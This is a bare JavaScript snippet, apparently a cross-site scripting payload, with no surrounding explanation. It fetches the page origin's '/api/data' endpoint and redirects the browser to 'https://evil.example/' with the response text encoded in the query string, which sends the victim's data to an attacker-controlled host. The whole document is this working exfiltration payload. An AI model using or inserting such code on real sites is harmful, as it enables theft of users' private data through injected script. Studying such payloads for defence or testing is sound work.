fetch('/api/data').then(r => r.text()).then(t => {
  location.href = 'https://evil.example/?d=' + encodeURIComponent(t);
});
